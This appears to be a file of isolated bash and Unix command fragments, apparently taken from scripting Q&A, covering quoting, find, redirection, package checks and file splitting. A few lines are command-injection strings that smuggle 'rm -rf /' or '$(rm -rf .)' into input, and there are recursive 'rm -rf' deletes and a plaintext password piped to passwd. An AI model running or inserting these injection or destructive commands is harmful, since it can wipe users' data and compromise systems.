sleep 1
basename $0 .env
SCRIPT_NAME=$(basename ${BASH_SOURCE[0]})
"hops max,"
perl foo.pl |
ps aux | grep -i app_name
mysql -e "SHOW SLAVE STATUS\G"
cygpath -w
Ctrl + R
pushd /to/build/directory
-t d
-N 1
1 0 1
random <min> <max>
(max - min + 1)
man bash
random --help
random -h
readlink -f
source /path/to/my_commands
apt-get install --reinstall bash-completion
matt b
bash -x
rename_function func orig_func
declare -f foo
test -n ...
return 1
eval "${_//$1/$2}"
eval "${_/$1/$2}"
command_help() { case "$1" in ''|-help) echo "help [command]"; return;; esac; "command_$1" -help "${@:2}"; }
" b "
declare -f
man bash
declare -fp $old_name
declare -fp
$(old_name ...)
file1 file2
exec 2>&1
exec 1>&2
$ pstree -p | grep 'term' | tr -d ' '
$ sudo ls -l /proc/{pid}/fd
exec 1>&2
exec 2>&1
exec 3>&1
exec 1>log
exec 2>&1
printf ... >&3
xargs -L 1
command | tee ; ( exit ${PIPESTATUS[0]} )
return value: 1
set -o pipefail
apt-get install moreutils
exec 4>&1
exec 4>&1
( )
{ }
consumer < <(producer)
producer | consumer
producer > >(consumer)
mv -iv "filename.txt" "filename.html"
brew install rename
rename -S .html .txt *.html
zsh: command not found: zmv
find . -name "*.js" -exec bash -c 'mv "$1" "${1%.js}".tsx' - '{}' \;
find . -name "*.js" -exec bash -c 'git mv "$1" "${1%.js}".tsx' - '{}' \;
./rename.sh .old .new
./rename.sh .html .txt
sed -e 's/[^[:alnum:]|-]//g'
echo $line
while read line; do
while read line; do echo $line; done
cat - > /dev/null
perl -ne 1
man awk
grep -r
-name "*"
system("bash", "-c", command)
export PATH=$PATH:$HOME/bin
head -1 "$file"
readlink -f $SOME_PATH
[[ ... ]]
alias x='y \'z '
'A '\''B'\'' C'
A 'B' C
man bash
su -c
bash -c
$(quote_args ...)
bash -c
bash -c
quote_args cd /; pwd 1>&2
quote_args cd /
pwd 1>&2
bash -c
bash -c
$(quote_args ...)
Robert'; rm -rf /
' + "'" + ' == '"'"'
./quote.sh --help
"like this"\!
'like this!'
cat /dev/urandom
cat /dev/urandom | base64
tr -dC '[:graph:]'
< /dev/random stdbuf -o0 tr -Cd '[:graph:]' | stdbuf -o0 head --bytes 32
cat | ...
awk -F "\"$MY_SHELL_VAR\""
use strict
echo $some_line >> /path/to/file
2>&1 > /path/to/output
netcat -w x
tail -c+N
head -cM
man login
chsh -s <path_to_shell>
sudo sh -c "echo '/usr/local/bin/zsh' >> /etc/shells"
source some-file
ls | sed ... | source -
source /dev/stdin
-L 1
-type f
rm $((find ...)
find ... -exec rm \{\}
-exec rm
-a -- 'foo' 'foo bar'
./a.sh -a foo "foo bar"
> 0
apt-get install
apt-get install curl
apt-get remove curl
dpkg-query -W -f='${Status}\n' curl | head -n1 | awk '{print $3;}' | grep -q '^installed$'
apt -qq list google-chrome-stable 2>/dev/null | grep -qE "(installed|upgradeable)" || apt-get install google-chrome-stable
dpkg --get-selections
MISSING='python3-venv python3-dev jq'
apt-get install $PACKAGES
dpkg-query --showformat='${db:Status-Status}'
$? = 0
man dpkg-query
dpkg -s
dpkg -s
dpkg -s
dpkg-query: no packages found matching
command -v
which $pkgname > /dev/null
command -v $pkgname
man bash
join /dev/fd/
-type f
-not -type d
sort -V
man find
-type c
find . -type f
find . -name '.svn' -depth -exec rm -rf '{}' \; -ls
watch -d cat /proc/meminfo
compgen -v
set | egrep "^\w+="
| less
( set -o posix ; set ) | less
set -o posix
sed ...
set -o
environment variables
grep -m 1
grep -n
typeset -m <GLOBPATH>
man zshbuiltins
man zshall
-type f
-maxdepth 1
2>  /dev/null
while read
history | grep " 840"
chmod g+s <dir>
chgrp <group> <dir>
find . -type d -exec chmod g+s {} \;
sg <group> <command>
find bla -name "*.so"
mmv "*" "lib#1"
find -execdir
cat > foo1
echo X >FIFO
sleep 3600
lock tables
LOCK TABLES
UNLOCK TABLES
SELECT GET_LOCK()
LOCK TABLES
START TRANSACTION
SELECT 1;
echo -e
:!tr ' ' '\n' | sort | tr '\n' ' '
SOME_VARIABLE="one two three four etc"
SOME_VARIABLE="etc four one three two"
echo $P
cd $P
cd $P
echo $SVN_INFO
man find
a  b c
[start, end)
[start, length]
-r slicedArray
declare arrValuesCmd="$1[@]"; declare arr=("${!arrValuesCmd}")
eval $retArrName='("${newArr[@]}")'
PASSWORD = 'XXXXX'
ssh remote_user@remote.host '[ -d /tmp/nonexist/dir ] || mkdir -p /tmp/nonexist/dir ]'; scp test.txt remote_user@remote.host:/tmp/nonexist/dir
ls -i <file>
find /dir -type f -inum <inode value> -mount
find -printf "%i:\t%p
cut -f 1 | sort | uniq -d
fgrep -f
ln -s
#!/usr/bin/env python
Bash Editor
find . -name '*.php' | xargs wc -l | sort -nr
| sort
| sort -r
-type f
wc -l
wc -l
find . -name '*.c' -print0 |xargs -0 wc -l|grep -v total|awk '{ sum += $1; } END { print "SUM: " sum; }'
-name '*.js' -or -name '*.php'
line -d
$cd sample
$wc -l *
gcc lineCount.c
./a.out *.txt
choco install cloc
cloc project-example
find folder1 folder2 -iname '*.txt' -print0 | du --files0-from - -c -s | tail -1
-mindepth 2
boo*;cd.*($\: $_
-o /dev/null
wc -l *| grep -v " total"
source ~/.bashrc
mvn clean install
mvn clean
cmd="blah $blah";$cmd
blah $blah
eval $cmd
"${log_cmd# }"
return <x>
exit <x>
umount /mnt/temp
umount --dont-fail-if-not-mounted /mnt/temp
rm -f
kdialog --help
<b><font color=red>
-i '~/myapps/foobarapp/icons/64x64/64x64.png'
ln -f
type env
env | grep '^PERL'
type env
printf %b $escaped
printf %b
"\ "
" "
(\ )
java program &
-z $run
emacs -nw
M-x shell-command
M-x shell-command
M-x shell-command
(setq shell-command-switch "-ic")
source ~/.bashrc
chmod +x proctest
ps u
top -p
function faketty { script -qfc "$(printf "%q " "$@")" /dev/null ; }
shellcheck <file> | less
$(date +%F)
$(date -I)
printf -v date ...
date=$(printf ...)
$(date +"%Y-%m-%d")
$(date +"%Y-%m-%d %T")
ls -l
find: -printf: unknown primary or operator
ls -t
ls -lt
man zshexpn
grep open
egrep 'open|closed|filtered'
man ifup
@Adrià Cidre
"$(ssh ...)"
split -l
> "$FILE/data.dat"
head | cat
rm $part
MYFILE=mycsv.csv && for part in $(split -n4 --additional-suffix=foo $MYFILE; ls *foo); do cat <(head -n1 $MYFILE) $part > $MYFILE.$part; rm $part; done
head -2 *foo
echo ${PATH}b
mysqldump ... | gzip -9 | ssh ...
mysqldump ... | bzip2 -9 | ssh ...
mysqldump ... | bzip2 -9 | ssh machine "bzip2 -d >..."
mysqldump ... | gzip -9 | ssh machine "gzip -d >..."
ls ~/.bash_*
psi.UseShellExecute = false;
alltray --help
screen -ls
screen -r
(ls -t|head -n 2;ls)|sort|uniq -u|xargs rm
chmod +x seq_wget
wget http://someaddress.com/logs/dbsclog01s00{1..3}.log
{a..z} {A..Z}
sudo ps aux
sudo killall mytool
wait ${!}
program_2 &
echo foo | script
script -c "make_hay" -f /dev/null | grep "needle"
echo "make_hay" | script
awk '{print} END {fflush()}'
CMD /?
help cmd
help vol
vol /?
for /r
xcopy /c
xcopy /?
ps aux | grep your_script_name
. foo.inc
./myscript http://www.foo.com "my file"
set -o vi
sudo !!
ls -R | findstr ".mp3"
ls -R
ls *.{mp3,exe,mp4}
ls *.(mp3|exe|mp4)
ls -l
printf "%s " $i
ls -l
ls -l
ls -1
INTO OUTFILE
kill -0
${__:+ <comment text>}
<comment text>
<comment text>
<comment text>
{ list; }
while read line; do _____ ; done
uniq -c $FILE | perl -pe 's|[ ]*([0-9]+)[ ]*(.*)|\2: \1|'
sort $FILE | uniq -c | perl -pe 's|[ ]*([0-9]+)[ ]*(.*)|\2: \1|'
bash -x myscript.sh
eval perl [...]
bash -x script
perl -ne 'chomp and print'
ls -l | perl -ne 'chomp and print'
./test.sh < test.cmds
head -n 1 file |sh
tr -d '\r' <file |sh
sed -n
a b c d
cvs add
dd if=/dev/random of=random-file bs=1024 count=1
while read data
dd bs=1 count=1
head -c
tr -d
1.3 source
${2} == "cat cat  file"
-d ''
unset IFS
IFS=' '
read -a arr <<<"$var"
echo foo bar baz | sed 's/ /\n/g'
ls -1|wc -l
"a b '' c '' d"
case retval in
case $retval in
case "$retval" in
case "$var" in
case "$choice" in
/bin/ls *.{java,cpp}
ls *.{java,cpp}
echo $0
set +H
git grep
grep -rn "$what" $where | egrep -v "$ignore" | grep --color "$what"
convert 'input.png[0x0+48+48]' output.png
checkout $1
sh -c
git br <somebranch>
git checkout <somebranch>
git checkout <branch>
git branch <branchname>
#!/usr/bin/env bash
bash script
animal[sound(key)] = animal(value)
declare -g
declare -A
hashtable=$(mktemp -d) 
echo $value > "$hashtable/$key" 
value=$(< "$hashtable/$key") 
export -f functionname
0   2   *   *   *   /usr/bin/time -a ~/output.log ~/uploadtimer.sh
crontab -e
crontab -e
crontab: installing new crontab
grep ^[AEIOU] samp
grep [AEIOU]$ samp
grep ^[AEIOU]$ samp
man githooks
grep -n magic_name /dev/null
cat test.sh | grep "hehe"
 < …
grep "hehe" < test.sh
cat test.sh
uptime | awk -F, '{print $5}'
-t 1
cat fifo
busybox sh
test -e "/tmp/emacs1000/server" || test -e "~/.emacs.d/server"
vi file
emacs --script
[[ conditional-expression ]]
grep -E
svn update
"^238-456 "
FILE *popen(const char *command, const char *mode)
/bin/bash --version
cat /proc/version
while IFS= read -r p; do printf "%s\n" "'$p'"; done </tmp/test.txt
$(cat /tmp/test.txt)
|| [[ -n $line ]]
command ... | while read -r line; do ...
find ... -print0
read -r X <&3
cat peptides.txt | xargs -I % sh -c "echo %"
at now + 1 minute
alter table
foreign keys
alter table
foreign keys
awk -f verify.awk data.txt
set -e
set -u
printf -v
join \| *.sh
tr " " "\n" <<< "$FOO" | paste -sd , -
x=${arr[*]// /,}
(seq 0 10; seq 5 15) | sort -n
echo `command`
flist=$(command ls -1 -d...
xargs echo
set -o vi
info cp
man cp
-m 664
mkdir -p /foo/bar
cp myfile.txt $_
mkdir -p /foo/bar
cp myfile.txt /foo/bar
cp –r
install -D file -m 644 -t /path/to/copy/file/to/is/very/deep/there
tar cf your_archive.tar file1 /path/to/file2 path/to/even/deeper/file3
tar xf your_archive.tar
install -D filename some/deep/directory/filename
install -D filename -m640 some/deep/directory/filename
install -D filename -m640 -t some/deep/directory/
install -D filena* -m640 -t some/deep/directory/
ditto my/location/poop.txt this/doesnt/exist/yet/poop.txt
set +H; echo -e "#!/bin/sh\nmkdir -p \$(dirname \"\$2\"); cp \"\$1\" \"$2\"\;" > ~/local/bin/cpmkdir; chmod +x ~/local/bin/cpmkdir
find -name files_you_re_lookin_for.* -exec cpmkdir {} ../extracted_copy/{} \;
script &
nohup script &
$TEMP > $FILENAME
man ls
man ls
ls -l
chmod 755 sedfile
{ list; }
fgrep $CMD
t = 0
tr '[[:upper:]]' '[[:lower:]]'
./spacetest "two--------words"
grep two words test.txt
echo $?
man test
[[ expr && expr || expr ]]
x != 0
[[ ]]
[ ]
-e $1
-l csv
csvsplit($0, a)
&& a[2] == 123
{ print $0 }
tail -f commandfile | command
tail -f
(cat your_file_with_commands; cat) | sh your_script
find . -ctime 15 -exec cp {} ../otherfolder \;
find . -ctime 15 -print0 | xargs --no-run-if-empty -0 cp --target-directory=../otherfolder
apt-get install rxvt-unicode
sudo 'command'
run 'command'
sudo '/bin/bash -c "whoami"'
git sh ag <string>
exec bash
set -k
#!/bin/ksh -k
cat initcmds.txt - | myprogram.exe
"history -rc bashcommands.history"
info sed
info sed
tree -d
find .
sort -r
while read
./this is a file.xml
$' \t\n'
cat -etv <<<"$IFS"
while file read ...
tail -f
unzip -l
grep -v "^--$" yourfile.txt
\( -type d -name .git -prune \)
-not -path .git
man find
find /home/www/ -type f
xargs -0
-i ''
sed: 1: "...": invalid command code .
Argument list too long
find -exec
find <mydir>
-type f
-exec command {} +
$(grep 'string' 'pathname' -Rl)
cp -iv $(grep 'string' 'pathname' -Rl) 'centralized-directory-pathname'
:bufdo %s#string#replacement#gc | update
grep -lr 'subdomainA.example.com' | while read file; do sed -i "s/subdomainA.example.com/subdomainB.example.com/g" "$file"; done
-i ''
npm install -g rexreplace
man grep
grep -Z
xargs -0
alias fdfind='fd'
num="´find -name /dirname sort ... | tail´"
tr -dc [0-9]
ls [0-9]* | sed 's/_/ _/' | sort -rn | awk '{printf "%03d", $1 + 1; exit}'
find . -name "vmware-*.log" -exec rm '{}' \;
find . -name vmware-*.log | xargs -i rm -rf {}
perl a.pl in1.a in1.b > out1.a 2> out1.b
if we_are_in_git_work_tree
git name-rev --name-only HEAD
git branch
git status --branch --porcelain | grep '##' | cut -c 4-
git describe
git describe --exact-match (--tags)
git describe
shopt -s nullglob
date +%j
date +%s
echo -n $STRING | sha512sum
echo -n $STRING | sha256sum
echo -n $STRING | sha224sum
echo -n $STRING | sha384sum
echo -n $STRING | sha1sum
echo -n $STRING | shasum
echo -n $STRING | shasum -a 512
echo -n $STRING | shasum -a 256
Some Example
test.sh "myscript.pl -g \"Some Example\" -n 1 -p 45"
test.sh myscript.pl -g "Some Example" -n 1 -p 45
sudo sh -c 'echo "server.bind=2000" >> /etc/lighttpd/lighttpd.conf'
ls -al
grep '^d'
cat *.txt | grep 'blabla' | sort | my_new_tool | tee -o res_file
find <pattern> -prune .svn -exec svn add {} \;
svn add
ls | egrep stuff | xargs svn add
find . -type f -name *.c -print | grep -v '\.svn' | xargs svn add
svn add *
source ~/.bashrc
shopt -s expand_aliases
R CMD INSTALL
R CMD check
./configure --help
CC=clang R CMD INSTALL /path/to/package/source
... | while read x; do
man bash
ps | egrep 11383
11383 pts/1    00:00:00 bash
ps | egrep 11383 | cut -d" " -f 4
tr -s ' '
${name%% *}
tr -s
ps | awk '/^11383/ {print $4}'
set $(free -h)
echo $7
$SHELL "$FILE"
expect -c '...'
send \"$pass\r\"
expect \">\"
expect conf
send {no pager}
grep -q
avoiding bashisms
session required pam_env.so
id -u
id -u
read -t
stat -t
lsof -b
test -d
read -t
test -d
(( $? > 128 ))
kill 13231
kill -- -$$
trap 'pkill -P $$' EXIT
echo "">$OUTPUT
mkdir -p $(dirname "$file"); cp "$file" $(dirname "$file")
echo "$i"
export $IFS='\n'
for f in "$v"
for f in $v
c=0; for i in $'1\\n2\\n3\\n4'; do echo -e iteration $c :$i:; c=$[c+1]; done
echo -e
$(( ... ))
echo "iteration $c :$i:"
echo iteration $c :$i:
iteration 0 :1 2 3 4:
select count
SQL1024N  A database connection does not exist.  SQLSTATE=08003
db2 connect
tail -f
jobs -x
jobs -x echo %1
jobs -p
exec 4< <(...)
while read x y z <&4; do ...
chomp(my $data = <MYDATA>);
... <(cat ...)
while read
sed <<< "$OLD"
echo "$OLD" | sed
[ "$OLD" != "$NEW" ] && mv
if [ "$OLD" != "$NEW" ]; then mv; fi
zcat <gzipped file> |  wc -L
zcat <gzipped file> |   awk '{print length}' | sort -u
wc: illegal option -- L
awk '{print length}' "$file_name" | sort -rn | head -1
echo "The longest line in the file $file_name has $(awk '{print length}' "$file_name" | sort -rn | head -1) characters"
The longest line in the file my_file has 117 characters
cat -n
if [ = ALL]
if [  = "ALL" ]; then
while read line; do ...; done <tempfile
chmod 755 *.sh and *.bat inside /Library/apache-tomcat-6.0.20/bin
chmod 755 /usr/bin/tomcat
ls -l /usr/bin/tomcat
find /Volumes/[AB] -name '*.bkf'
ls -t
set -o vi
set -o emacs
printf %q "$quote-me"
bash -c
emit_bash_code | bash
git clone ...
Initialized empty Git repository in /root/client_scripts/jojo/.git/
git clone
2>&1 | ...
eval 'ssh-agent'
cat /proc/scsi/usb-storage/*
new line
find /directory -name '*.tgz' -exec tar ztf {} \| grep filename \;
sub(/[ \t]*=[ \t]*/, "=");
printf -v
rdesktop -r disk:bacon=$(echo ~/bacon) host
's/"/\\"/g; s/^/"/; s/$/",/;'
man bash
ls **/*.ext
-type f
ls -1 {,**/}*.*
echo **
ls **
ls A
ls A/AB
wc -l
ls ** | wc -l
shopt -s globstar
find . -type f | wc -l
ls -1 **/*.*
ls -1 {,**/}*.*
ls -1 {,**/}*
ls -1 **/*
ls -1 **/{.[^.],}*
ls -1 {,**/}.?*
ls -1 {,**/}.*
shopt -s dotglob
shopt -u dotglob
head $f -n1
head -n1 $f
$ cowsay-loop foo bar buzz
printf "%x" $val
[[ ... ]]
[ ... ]
[[ ... ]]
[ foo ]
test foo
[[ foo ]]
[ ]
man bash
-c string
bash -c "echo arg 0: \$0, arg 1: \$1" arg0 arg1
arg 0: arg0, arg 1: arg1
bash -c '${0} ${1+"$@"}' <command> [argument]...
shopt -s extglob
ls -l | awk '{print $2}'
echo $LANG
ps -C ...
grep -v grep
kill -0 $(cat $pid_file)
set -o noclobber
dotlockfile -u file.lock
if [ $? -eq 0 ]; then
grep "processName"
exec >> myfile.log 2>&1
nohup cmd args...
lua -e "print('This is red->\27[31mred\n')"
ac_compile='$CC -c $CFLAGS $CPPFLAGS conftest.$ac_ext >&5'
«-I/path with space»
foo bar/baz.c
./configure CC=mygcc
man bash
man bash
+o emacs
+o vi
-c 1
man ping
head -n 1 input | wc -w
tp(){ awk '{for(i=1;i<=NF;i++)a[i][NR]=$i}END{for(i in a)for(j in a[i])printf"%s"(j==NR?RS:FS),a[i][j]}' "${1+FS=$1}";}
tp(){ awk '{for(i=1;i<=NF;i++)a[i,NR]=$i}END{for(i=1;i<=NF;i++)for(j=1;j<=NR;j++)printf"%s"(j==NR?RS:FS),a[i,j]}' "${1+FS=$1}";}
FS='[ ]'
rs -T
Rscript -e 'write.table(t(read.table("stdin",sep=",",quote="",comment.char="")),sep=",",quote=F,col.names=F,row.names=F)'
Rscript -e
R -e
ignoring SIGPIPE signal
head -n1
jq -R .
s==" "?/ /:s
tr ':' ' '
datamash transpose
cat table.tsv | python -c "import pandas as pd, sys; pd.read_csv(sys.stdin, sep='\t').T.to_csv(sys.stdout, sep='\t')"
column/field count
1.331 billion
10.5 secs
mawk 1.3.4
11.03 secs
gawk 5.1.1
file --mime myfile.text
set bell-style none
xxd -r
hd filename
grep -o
#!/usr/bin/env python
for file in $(ls $1)
for file in $(echo $1)
echo *
resize * 400x400 jpg
resize * 400x400
resize * 400x400
resize 400x400 *
ls * | sed -e s/^[^.]*.// > /tmp/filenames.txt
pwd | rev | cut -f1 -d'/' - | rev
sudo gem update rake
cd /home/
/bin/sh -c "xfst -f build/latin.fst.build"
0x0d 0x0a
hd filename
od -xc filename
:%!xxd -r
sudo apt-get install bless
emacs -nw
M-x hexl-mode
GNU time
GNU time
ls -a1
find *
ls -ld $(find .)
ls -ltd $(find .)
tree -fi
find -type f | xargs ls -1
ls -mR *
sed -n 's/://p'
$ ls
$ find
ls -lR
ls -l $(find . -type f)
ls -a
man xargs
find -print0
grep command
grep -i "*.docx" result.txt
man inotifywait
man inotifywatch
tr -d "\r"
C:/Program Files/Git/path/to/dir
[ -f $F ]
perl -i -npe 's/default_color acolor/default_color another_color/' list_of_files
help export
John Doe <doe@none.com>
From 
perl -p -e 's/^From ([^ ])/From  $1/'
echo "From  me"
"Long Name" <email-addr@example.com>
strings "$(dirname $(which git-diff))/*" | grep 'less '
ps aux | grep less
git diff
gzip *
gzip -r .
Argument list too long
"already has .gz suffix"
sed -n 2~2p filename
/usr/bin/mysql --user=asdf --password=asdf mydb < ./dump.sql
/usr/bin/mysql --user=asdf --password=asdf mydb < /full/path/to/dir/dump.sql
ls -l /proc/$$/exe | sed 's%.*/%%'
bash --version
chmod +x
myscript.pl > myfile.txt
bash: perl myscript.pl: command not found
# perl -e 'print "hi";'
$ echo $PATH
ls /usr/bin/perl
file1_2.54 Ghz.xls
c:\Program Files
c:\Program Files
man 5 terminfo
echo "$returnstring"
stat --format="%s" FILE
du -h $FILE
wc -c < filename
wc -c < /usr/bin/wc
du -ks | awk '{print $1*1024}'
find $HOME -type f -name "*~" -exec du -h {} \;
ls -n
ln -dn
length + NR
#! /bin/sh
ps aux
grep -v grep
grep -c [-i] $ProcessName
killall -s
ps aux | grep ... | awk ... | sed ...
ssh -f
ps | awk
ps -aux | grep ...
TCP FORWARDING
ssh ... &; pid=$!
sleep 10
synergyc localhost
sleep 10
sendmail -bd
sendmail -OSMART_HOST=nameofhost.com
(echo "${MESSAGE}" | ${uuencode} ${ATTACHMENT}
) | ${mailx} -s "${SUBJECT}" "${TO_LIST}"
port install msmtp
man mail
script.sh keyword1 keyword2 keyword3 < file
brew install gawk
grep whatever wherever | ./foo.bash
svn revert --recursive
kate dir/somefile.txt dir/subdir/subsub/somefile2.txt dir/subdir2/somefile.txt
kate $(find dir -type f)
-type f
ls -1
find ... -exec
kate $(...)
find ... +
tar -xzvf /mnt/cf/bundle.tgz -O version.txt
wget --tries=0 --retry-connrefused $URL -O - >> output.txt
command > file
command >> file
cleartool lsco -short -rec
cleartool ci -nc filename
while read
tail -f
screencapture -x -C $FILENAME
while read -d $'\0'
-name '.*' -prune
YYYY-MM-DD hh:mm:ss
date|cut -d" " -f1
man strftime
YYYY-MM-DD hh:mm:ss
read -r
brew install coreutils
man strftime
cut -d '.' -f2
find .
cd src;
cd -;
realpath $path
tr -d ...
RC = $?
set -e
|| true
grep -Hn
done' ./myDemo: line 62:
while $TRUE
trap ... DEBUG
date +%s%3N
trap DEBUG
echo "some_text i*resolution j*resolution 15.95 cm"
perl -le 'for (@ARGV){ $h{$_}++ }; for (keys %h){ print $_ }' $variable
$h{$a} <=> $h{$b}
$a cmp $b
perl -le 'for (@ARGV){ $h{$_}++ }; for (sort { $h{$a} <=> $h{$b} || $a cmp $b } keys %h){ print "$h{$_}\t$_" }' $variable
perl -lne '$h{$_}++; END{ for (sort { $h{$a} <=> $h{$b} || $a cmp $b } keys %h){ print "$h{$_}\t$_" } }' fruits
nohup script &
disown $!
if [ $PASSWORD != 'pass' ]; then
if [ "$PASSWORD" != 'pass' ]; then
#!/usr/bin/env bash
. ./script.sh
FOO=bar; export FOO
sed "s/http/\nhttp/g" <(curl "http://www.cnn.com") | sed -n "s/\(^http[s]*:[a-Z0-9/.=?_-]*\)\(.*\)/\1/p"
alias lsurls='_(){ sed "s/http/\nhttp/g" "${1}" | sed -n "s/\(^http[s]*:[a-Z0-9/.=?_-]*\)\(.*\)/\1/p"; }; _'
-p "prompt"
-n 1
read -p "my prompt" -n 1 -r my_var
if [[ $REPLY =~ ^[^Yy]$ ]]
while [ ! -f $1 ]
read -p "Re-enter the filename and hit <Enter>: "
R CMD build PKG
$REV: number $
R CMD build
R CMD build ...
R CMD build
R CMD build
* char
-f: command not found
[[ ... ]]
[ ... ]
cat $name '.jpg'
echo $name | grep {pattern} | cut -d _ -f 2
man ssh
--user username:password
source sample.sh
[[ ]]
wc -m
trap "rm $tmpfile" EXIT
Process Substitution
chmod u-w
(sleep 60 && echo "A")&
sort -R
sed -i 's/\s*[0-9]\s;\s*serial/20091218 ; serial/g' *.zone
eval a=\$$a
declare -n
read -s
man bash
read -s
ssh root@ip
#!/usr/bin/expect -f
spawn ssh root@$IPADDR
expect "password:"
sleep 1
send "$rpass\r"
./script.sh array1
line 5: ${#$1[@]}: bad substitution
someProgram "1 2" 3
[1 2]
for file in *
eval ls $files
while ... read ... done < <(find ... -print0)
<( )
:! bash
vim MyProgram.java
[8;1H~ [9:1H~ [10:1H~ ... etc.
:set makeprg=name_of_your_make_program
:help sh
echo Problem killing...
pkill.sh > /dev/null 2>&1
kill $X > /dev/null 2>&1;
kill $X
> /dev/null
grep -E
[ -z ${string/$pattern} ]
string="x -o 1 -eq 1"
$array[] = 'foo';
post-"git svn dcommit"
git svn info
git diff git-svn
-v k=text
tr -d '{}'
sed 's/\(^"\|"$\)//g'
| perl -pe 's/"text"://; s/^"//; s/",$//'
grep -o
grep -o
chmod +x jq
{ "foo": "bar" }
jsonlookup access token id
echo "{\"field\": \"value\"}"
data[ "authInfo" ]
data[ "authInfo" ][ "tokenServicesUrl" ]
jq '[ "authInfo" ]'
jq '[ "authInfo" ][ "tokenServicesUrl" ]'
gron -u
grep -F
yum install php-cli
yq e '.name' $FILE
yq --output-format props $FILE
yes n
flock <fd>
grep httpd
grep httpd
ps -ef | grep [h]ttpd
grep [h]ttpd
grep ... | wc -l
grep -c ...
scp "/media/...
"My\ Book"
"My\\ Book"
set -x
set +x
Žvaigždės aukštybėj užges
Zvaigzdes aukstybej uzges
iconv -f UTF8 -t US-ASCII//TRANSLIT testutf8.txt
cat main.js | sed -e 's!/\*> \(.*\) \*/!cat \1!g'
cat \1
cat file1 file2 file3 > output
this is a line
for .. in $var
cat $filename | ...
echo "$ll"
echo $ll
0:1 0:2
A = ( 0 )
B = ( 1 2 )
$< $( $> $)
su -c
/usr/bin/bash -l
"a b c d e f g h i j k l"
"a b c, d e f, g h i, j k l"
"0 0 100 100"
/bin/bash -c
ls -a
touch calendar categories contacts todo
ls -l /home/user/.gpe
echo *
cd $SVNPATH
chmod a+x script
man bash
Brace expansion
echo -e Da.jpg\n Db.jpg\n Dc.jpg\n
ln -s bash-hexdump bash-hexdump-stream
hexdump -C
$(rm -rf .)
nohup process.py &
[ $? == 0 ]
./defvalue.sh first-value second-value
./defvalue.sh first-value
find . -name "*'*" -delete
find . -name "*'*" -maxdepth 1 -delete
sudo rm -rf 2018-03-*
xaa xab xac
output_prefix01 output_prefix02 output_prefix03 ...
Syntax split [options] [INPUT [PREFIX]]
split -n 4 input output.
split <file> -l 1000
split <file> -b 10M 
cat x* > <file>
split -l 10 filename
split -n 5 filename
split -b 512 filename
split -C 512 filename
split -l 200 --numeric-suffixes --additional-suffix=".txt" toSplit.txt splited
find ... -exec cp '{}' test_path/"test_"'{}'
find ... -exec cp "{}" "test_path/test_{}" \;
set -x
set -e
set -e
set -e
|| :
set -e
ps -p
source ./houdini_setup
tail -f
tail -f
tail -f logfile | read -t 30 line
tail -f
kill -9
while read line
tail -f
tail -f logfile
while read
tail -f trade.log
Rscript $RFILE $ARGUMENTS
Rscript $RFILE $ARGUMENTS
case ... esac
exec $*
Matlab.evalConsoleOutput("cd('C:\Program Files\')");
ccc245 , -12.3
for i in IN.TXT  ;  do sort -k6n $i | head -n 10; done
grep -n VALUE in_s*
trap -l
false || echo "It failed"
true && echo "It succeeded"
blockid = next(inf)
blockid = inf.next()
clients/clientname/jobs/clientcode/"folder that needs to be renamed"
program args
prog1 $(prog2 $(prog3))
man 4 pty
man 4 pts
"bash" typeof "shell" == true
MYSTRING="Be liberal in what you accept, and conservative in what you send"
< tmp
find . -name '*.mp3' -exec afplay '{}' \;
shopt -s extglob
grep -R "/~test/dev/portal" .
cat < /dev/tcp/hostname/port
if [ -f $fileName ]; then
if -f "$fileName" ];
date +"%k"
(( ))
find -type f -name *.jpg
find . -type f -name *.jpg | sed -e 's:^0*::'
M-x whois
ln -s /cygdrive/c /c
$ emacs&
egrep -o
"; rm -rf /;"
ls *.cpp
stat -c %U $(tty)
who am i
filename= filename.replace(' ', '\\ ')
[ ]
H 0
[ ]
[[ ]]
key (space)+ value
sed, awk, grep
-Key1       Value1    -Key2    Value2   -Key3  Value3
/tmp/A, /tmp/B, /tmp/C
find . -type d -maxdepth 1
-maxdepth 1
-mindepth 1
-type d
-printf '%f\n
*/ .*/
find | xargs
latemk -c
for dir $(subdirs); do stuff; done
find -type d | grep "/A" | awk -F / '{print $NF}'
find -type d | grep "/B" | awk -F / '{print $NF}'
find -type d | grep "/C" | awk -F / '{print $NF}'
ls -1
tr '[A-Z]' '[a-z]'
uniq -c
grep -v " 1 "
ls -1
find .
find DIRNAME
find -type f
find -type f
-exec readlink -m {} \;
gawk 'BEGIN{FS="/";OFS="/"}{$NF=tolower($NF);print}'
uniq -c
echo $test
* master
echo "$test"
echo ${test:2}
git-symbolic-ref HEAD
git describe --contains --all HEAD
cygpath ""
-Xms512m -Xmx1024m
"-Xms512m -Xmx1024m"
which bash
@(cat field)
for f in `tree -fi | grep foo`; do sed -i -e 's/foo/bar/g' $f ; done
ls -l | sort -n -k 5
alias lsls='ls -l | sort -n +4'
awk '{print $2}' $DATALOG | awk ' !x[$0]++' | sort -u | tr "_" " "| sed 's/^/\"/' | sed 's/$/\"/' | tr "\n" "," | sed 's/.$//'
tell application \"System Events\" to return (choose from list {\"field 2\",\"field 3\",\"field 4\"})
cat ... |
tail -1
set -e
... do stuff ...
find / -name .svn -type d
./find_svn.sh /var/www
cd -
(cd /home/user/git/app && git tag -l)
cd -
PS1=$(__git_ps1 " (%s)")$
env: ": No such file or directory
. ~/.profile
ps | grep SCREEN
bash --login
env > log
crontab -e
. init-my-workspace.sh
source init-my-workspace.sh
shopt -u dotglob
sendmail -oi -t
top - 15:15:38 up 745 days, 15:08, 5 users, load average: 0.22, 0.27, 0.32 Tasks: 133 total, 1 running, 132 sleeping, 0 stopped, 0 zombie Cpu(s): 6.4% us, 1.6%sy, 0.0% ni, 91.7% id, 0.3% wa, 0.0% hi, 0.0% si Mem: 2074716k total, 2038716k used, 36000k free, 84668k buffers Swap: 4192924k total, 107268k used, 4085656k etc...
arp -s
zf create action add edit
man ^
grep -v
~$ cmd | tee log_file
~$ cmd 2>log_file
./program < infile.in > outfile.o
$(ls | grep ".txt")
$(ls *.txt)
$(ls | grep ".txt")
cat [directory_path]/**/*.[h,m] > test.txt
[ -e $"all.txt" ] && rm $"all.txt"
-d 1
awk 1
echo thePassword | passwd theUsername --stdin
./my_add_user.sh USER PASSWD
tail -f
alias make="make -j 8"
alias make='make -j 8'
-j 8
setenv MAKEFLAGS '-j 8'
export MAKEFLAGS='-j 8'
chmod +x /usr/bin/make
echo *
test XYZ && command
if test XYZ ; then command ; fi
test XYZ
test XYZ
[ XYZ ]
if [ XYZ ] ; then command ; fi
test -e "$file" &&
set -x
sh -x scriptname.sh
